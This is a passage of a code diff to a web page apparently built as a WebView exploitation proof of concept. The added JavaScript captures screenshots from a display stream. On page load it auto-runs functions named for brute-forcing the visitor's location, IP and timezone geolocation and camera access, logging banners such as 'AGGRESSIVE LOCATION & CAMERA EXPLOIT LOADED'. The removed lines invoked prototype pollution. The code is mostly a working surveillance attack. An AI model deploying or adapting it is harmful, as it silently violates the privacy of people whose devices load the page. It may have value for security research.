+                    logCamera(`[!] Screen capture failed: ${error.message}`, 'warning');
+                }
+            } else {
+                logCamera('[!] getDisplayMedia not available', 'error');
+            }
+        }
+
+        function takeScreenshot(stream) {
+            logCamera('[+] Attempting to take screenshot...', 'warning');
+            
+            try {
+                const video = document.getElementById('videoPreview');
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                ctx.drawImage(video, 0, 0);
+                
+                // Convert to data URL
+                const dataURL = canvas.toDataURL('image/png');
+                logCamera(`[!] Screenshot captured! Size: ${dataURL.length} bytes`, 'success');
+                
+                displayMediaData({
+                    method: 'screenshot',
+                    size_bytes: dataURL.length,
+                    dimensions: `${canvas.width}x${canvas.height}`,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Log first 100 chars of data URL as proof
+                logCamera(`[+] Data URL preview: ${dataURL.substring(0, 100)}...`, 'data');
+                
+            } catch (error) {
+                logCamera(`[!] Screenshot failed: ${error.message}`, 'warning');
+            }
         }
 
         // Auto-execute on load
         window.onload = function() {
-            log('[+] WebView Exploitation PoC loaded', 'success');
-            log('[+] Demonstrating silent attacks...', 'warning');
+            logLocation('[!] AGGRESSIVE LOCATION & CAMERA EXPLOIT LOADED', 'error');
+            logCamera('[!] READY FOR CAMERA EXPLOITATION', 'error');
             
-            // Auto-run core exploits
+            // Auto-run location extraction
             setTimeout(() => {
-                executePrototypePollution();
+                bruteForceLocation();
+                tryIPGeolocation();
+                tryTimeZoneLocation();
             }, 1000);
             
+            // Auto-run camera exploitation
             setTimeout(() => {
-                attemptMediaAccess();
-            }, 2000);
-            
-            setTimeout(() => {
-                attemptLocationAccess();
+                bruteForcCamera();
             }, 3000);
         };
     </script>
